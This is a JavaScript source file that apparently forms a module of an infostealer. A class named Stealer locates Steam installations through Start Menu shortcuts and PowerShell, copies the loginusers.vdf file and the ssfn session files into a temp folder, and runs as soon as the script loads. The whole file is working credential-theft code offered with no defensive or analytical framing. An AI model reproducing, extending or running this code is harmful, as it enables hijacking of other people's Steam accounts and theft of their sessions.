const fs = require('fs');
const path = require('path');
const os = require('os');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const shutil = require('fs-extra');

class Utility {
  static async getLnkFromStartMenu(appName) {
    
    return [path.join(process.env.APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", `${appName}.lnk`)];
  }

  static async getLnkTarget(lnkPath) {
    try {
      const { stdout } = await exec(`powershell -command "(New-Object -COM WScript.Shell).CreateShortcut('${lnkPath.replace(/'/g, "''")}').TargetPath"`);
      return stdout.trim();
    } catch (err) {
      console.error(`Error getting target path for ${lnkPath}: ${err.message}`);
      return null;
    }
  }
}

class Stealer {
  constructor() {
    this.tempFolder = path.join(os.tmpdir(), "steamsession");
    this.steamStolen = false;
  }

  async stealSteam() {
    if (Settings.CaptureGames) {
      console.info("Stealing Steam session");

      const lnkPaths = await Utility.getLnkFromStartMenu("Steam");
      const steamPaths = Array.from(new Set(
        (await Promise.all(lnkPaths.map(async (lnk) => {
          const target = await Utility.getLnkTarget(lnk);
          return target ? path.dirname(target) : null;
        }))).filter(Boolean)
      ));

      const multiple = steamPaths.length > 1;

      if (steamPaths.length === 0) {
        steamPaths.push("C:\\Program Files (x86)\\Steam");
      }

      for (const [index, steamPath] of steamPaths.entries()) {
        const steamConfigPath = path.join(steamPath, "config");
        if (fs.existsSync(steamConfigPath) && fs.lstatSync(steamConfigPath).isDirectory()) {
          const loginFile = path.join(steamConfigPath, "loginusers.vdf");
          if (fs.existsSync(loginFile) && fs.lstatSync(loginFile).isFile()) {
            try {
              let _saveToPath = this.tempFolder;
              if (multiple) {
                _saveToPath = path.join(this.tempFolder, `Profile ${index + 1}`);
              }
              await fs.promises.mkdir(_saveToPath, { recursive: true });

              await fs.promises.copyFile(loginFile, path.join(_saveToPath, "loginusers.vdf"));
              this.steamStolen = true;
            } catch (err) {
              console.error(`Error copying loginusers.vdf: ${err.message}`);
            }
          }

          const filesInSteamPath = fs.readdirSync(steamPath);
          for (const file of filesInSteamPath) {
            if (file.startsWith("ssfn")) {
              const ssfnFilePath = path.join(steamPath, file);
              if (fs.existsSync(ssfnFilePath) && fs.lstatSync(ssfnFilePath).isFile()) {
                try {
                  let _saveToPath = this.tempFolder;
                  if (multiple) {
                    _saveToPath = path.join(this.tempFolder, `Profile ${index + 1}`);
                  }
                  await fs.promises.copyFile(ssfnFilePath, path.join(_saveToPath, file));
                  this.steamStolen = true;
                } catch (err) {
                  console.error(`Error copying ${file}: ${err.message}`);
                }
              }
            }
          }
        }
      }

      if (this.steamStolen && multiple) {
        await fs.promises.writeFile(path.join(this.tempFolder, "Info.txt"), "Multiple Steam installations are found, so the files for each of them are put in different Profiles");
      }

      console.log(`Steam session information saved to ${this.tempFolder}`);
    }
  }
}

const Settings = { CaptureGames: true };

const stealer = new Stealer();
stealer.stealSteam();